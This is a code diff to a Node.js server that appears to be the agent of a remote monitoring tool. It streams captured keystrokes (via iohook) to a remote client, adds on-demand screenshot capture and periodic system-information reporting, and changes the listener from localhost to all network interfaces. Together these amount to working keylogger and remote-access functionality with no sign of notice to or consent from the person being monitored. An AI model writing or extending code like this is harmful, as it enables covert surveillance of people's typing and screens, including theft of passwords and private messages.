@@ -1,18 +1,17 @@
 const { EventEmitter } = require('events')
 const { Packets, PacketParser } = require('./lib/Protocol')
 const Connection = require('./lib/Connection')
+const UUID = require('node-machine-id').machineIdSync()
 
-const iohook = require('iohook')
-
-class Server {
+class Server extends EventEmitter {
   constructor (password) {
+    super()
     const self = this
 
     this._UDPport = 41234
     this._TCPport = 41233
 
     this.password = password
-    this._eventEmitter = new EventEmitter()
     this.__authAttemptInterval__ = 1 * 1000
     this.__maxAuthAttempts__ = 4
 
@@ -30,7 +29,7 @@ class Server {
     {
       const TCPserver = new Connection.TCP.Server()
 
-      TCPserver.listen(this._TCPport, '127.0.0.1', function () {
+      TCPserver.listen(this._TCPport, '0.0.0.0', function () {
         const address = this.address()
         console.log(`TCP server listening ${address.address}:${address.port}`)
       })
@@ -40,6 +39,8 @@ class Server {
         socket.__authenticationAttemptCount__ = 0
 
         console.log('A new connection has been established.')
+
+        socket.write(Packets.r_Hello.create({ status: null, id: UUID }))
 
         socket.on('payload', (...data) => {
           self._onPayload(...data, socket)
@@ -80,6 +81,7 @@ class Server {
       if (!packet.data) return
 
       if (!conn.keylog) {
+        self.__iohookLib = require('iohook')
         conn.keylog = {
           buffer: [],
           intervalID: null,
@@ -90,9 +92,13 @@ class Server {
       }
 
       function disableKeylog () {
+        if (!conn.keylog) return
+
         clearInterval(conn.keylog.intervalID)
         conn.keylog.intervalID = null
-        iohook.off('keypress', conn.keylog.keyEvt)
+        if (self.__iohookLib) {
+          self.__iohookLib.off('keypress', conn.keylog.keyEvt)
+        }
       }
 
       if (packet.data.interval === 0) {
@@ -103,18 +109,26 @@ class Server {
 
       if (conn.keylog.intervalID) clearInterval(conn.keylog.intervalID)
 
-      iohook.on('keypress', conn.keylog.keyEvt)
-      iohook.start()
+      self.__iohookLib.on('keypress', conn.keylog.keyEvt)
+      self.__iohookLib.start()
 
       conn.keylog.intervalID = setInterval(function () {
         // Send loop
-        if (conn.keylog.buffer.length != 0) {
+        if (conn.keylog.buffer.length !== 0) {
           conn.tcp.write(Packets.r_Keylog.create(conn.keylog.buffer))
           conn.keylog.buffer = []
         }
       }, packet.data.interval)
 
-      conn.tcp.__destructors.keylog = disableKeylog
+      conn.tcp.__destructors.keylog = disableKeylog.bind(conn)
+    })
+
+    const screenshot = require('./lib/Screenshot')
+    this.on(Packets.Screenshot, async function (packet, conn) {
+      let screenshotData = await screenshot.screenshot()
+      conn.tcp.write(Packets.r_Screenshot.create(
+        screenshotData
+      ))
     })
   }
 
@@ -155,6 +169,28 @@ class Server {
           port: socket.port
         }
         this.clients_lookup[address] = connectionPair
+
+        const systemInformation = require('./lib/SystemInformation')
+        Promise.all([
+          systemInformation.getMetaInformation(),
+          systemInformation.getDynamicInformation()
+        ]).then(([metaData, dynamicData]) => {
+          this._UDPserver.write(
+            Packets.Poll.create({ ...metaData, ...dynamicData }),
+            socket.address,
+            socket.port
+          )
+        })
+
+        setInterval(() => {
+          systemInformation.getDynamicInformation().then(data => {
+            this._UDPserver.write(
+              Packets.Poll.create(data),
+              socket.address,
+              socket.port
+            )
+          })
+        }, 3000)
 
         return
       }
@@ -241,11 +277,7 @@ class Server {
       console.log('NOT AUTHENTICATED')
     }
 
-    this._eventEmitter.emit(packet.constructor, packet, connectionPair)
-  }
-
-  on (evt, func) {
-    this._eventEmitter.on(evt, func.bind(this))
+    this.emit(packet.constructor, packet, connectionPair)
   }
 }
 
